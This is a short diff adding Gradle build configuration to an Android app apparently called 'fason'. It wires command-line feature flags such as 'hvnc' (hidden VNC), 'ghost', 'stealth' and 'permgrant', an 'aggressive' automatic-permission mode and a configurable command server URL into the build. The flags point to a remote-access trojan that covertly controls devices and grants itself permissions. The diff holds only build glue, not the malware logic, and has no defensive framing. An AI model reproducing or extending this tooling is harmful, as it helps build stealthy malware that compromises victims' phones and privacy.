@@ -1,0 +1,12 @@
+// 2026 upgrade — add to fason/app/build.gradle inside android { defaultConfig { ... } }
+// Enables feature-flag builds from the command line:
+//   ./gradlew assembleRelease -Pfeatures=hvnc,ghost,permgrant -PautoPerm=aggressive
+
+def selectedFeatures = (project.findProperty('features') ?: 'hvnc,stealth').split(',')
+def autoPermMode = project.findProperty('autoPerm') ?: 'standard'
+
+android.defaultConfig.buildConfigField "String", "SERVER_URL", "\"${project.findProperty('serverUrl') ?: 'http://localhost:32766'}\""
+android.defaultConfig.buildConfigField "String", "AUTO_PERM_MODE", "\"${autoPermMode}\""
+selectedFeatures.each { f ->
+    android.defaultConfig.buildConfigField "boolean", "FEATURE_" + f.toUpperCase().replace('-','_'), "true"
+}
